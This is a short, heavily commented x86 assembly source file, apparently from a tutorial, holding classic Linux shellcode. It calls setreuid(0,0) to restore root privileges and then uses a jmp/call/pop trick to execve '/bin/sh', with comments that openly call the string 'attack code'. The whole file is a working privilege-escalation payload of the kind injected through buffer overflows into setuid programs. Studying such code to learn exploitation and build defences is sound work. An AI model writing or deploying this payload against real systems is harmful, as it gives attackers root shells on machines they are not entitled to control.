BITS 32;
;setreuid(uid_t ruid, uid_t euid)
mov eax, 70			;parm 70 into eax, syscall #70, to set uid
mov ebx, 0			;parm 0 into ebx, set real uid to root
mov ecx, 0			;parm 0 into ecx, set effective uid to root
int 0x80			;interrupt kernel promoting user to su if possible

;obtain address of attack string for modification
jmp short trick
sucker:
	pop ebx			;ebx contains address of attack string to modify

;execve(const char *filename, char *const argv [], char *const envp[])
mov eax, 0			;follow calling conventions for execve
mov [ebx+7], al		;replace X in string with null (after /bin/sh) termining attack
					;7 bytes offset from the beginning
mov [ebx+8], ebx	;replace 4 bytes "AAAA" with address of the attack
					;string offset 8 bytes from ebx
mov [ebx+12], eax  	;terminate string w/NULL address (4 bytes of 0)
					;replacing BBBB(12 bytes offset)
mov eax, 11			;execve is syscall #11
lea ecx, [ebx+8]	;ecx has 32bit address where AAAA was in the string
lea edx, [ebx+12]	;address of Null where BBBB was in the string
int 0x80
trick:
	call sucker		;push address of attack code into stack, then branch to sucker
	db '/bin/shXAAAABBBB'; attack code to modify
